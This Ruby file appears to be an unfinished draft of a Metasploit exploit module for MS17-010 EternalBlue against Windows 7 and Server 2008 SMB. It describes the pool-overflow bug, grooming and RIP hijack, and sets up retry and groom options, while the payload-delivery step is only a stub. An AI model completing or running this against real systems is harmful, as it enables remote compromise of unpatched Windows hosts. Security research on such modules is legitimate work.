# This module is a work in progress, do not use it yet.

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS17-010 EternalBlue SMBv1/SMBv2 Kernel Pool Corruption',
      'Description'    => %q{
        This module is a port of the Equation Group EternalBlue exploit, part of
        the FuzzBunch toolkit released by Shadow Brokers.

        There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
        is calculated in Srv!SrvOs2FeaListSizeToNt, with logical error where a DWORD
        is subtracted into a WORD. The kernel pool is groomed so that overflow is
        well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
        completed in srvnet!SrvNetCommonReceiveHandler.

        This exploit, like the original may not trigger 100% of the time, and should be
        run continuously until triggered.
      },

      'Author'         => [
        'Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0
        'Dylan Davis <dylan.davis@risksense.com>',  # @jennamagius
        'Equation Group',
        'Shadow Brokers'
       ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'MSB', 'MS17-010' ],
          [ 'CVE', '2017-0143' ],
          [ 'CVE', '2017-0144' ],
          [ 'CVE', '2017-0145' ],
          [ 'CVE', '2017-0146' ],
          [ 'CVE', '2017-0147' ],
          [ 'CVE', '2017-0148' ],
          [ 'URL', 'https://github.com/RiskSense-Ops/MS17-010' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'           => 1024,
          'EncoderType'     => Msf::Encoder::Type::Raw,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 7 and Server 2008 (x64) All Service Packs',
            {
              'Platform'       => 'win',
              'Arch'           => [ ARCH_X64 ],
              # todo: ring0 opaque offsets
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'March 14, 2017'
    ))

    register_options(
      [
        Opt::RPORT(445),
        OptInt.new( 'WAIT', [ true,  "The number of seconds to wait for the attack to complete.", 180 ] ),
        OptInt.new( 'MaxExploitAttempts', [ true,  "The number of times to retry the exploit.", 3 ] ),
        OptInt.new( 'GroomAllocations', [ true,  "The number of times to groom the kernel pool.", 12 ] ),
        OptInt.new( 'GroomDelta', [ true,  "The amount to increase the groom count by per try.", 5 ] )
      ])
  end

  def check
    # todo: create MS17-010 mixin, and hook up auxiliary/scanner/smb/smb_ms17_010
  end

  def exploit
    print_status("Connecting to the target (#{datastore['RHOST']}:#{datastore['RPORT']})...")

    client1 = create_smb_connection(true, false)
    client1.tree_connect("\\\\#{datastore['RHOST']}\\IPC$")

    print_status("Sending all but last fragment of exploit packet")

    print_status("Starting non-paged pool grooming")
    
    # etc

    handler
    disconnect
  end

  def create_smb_connection(smb1_enabled, smb2_enabled)
    sock = TCPSocket.new datastore['RHOST'], datastore['RPORT']
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: smb1_enabled, smb2: smb2_enabled, username: '', password: '')
    client.negotiate
    client.authenticate

    return client
  end

end
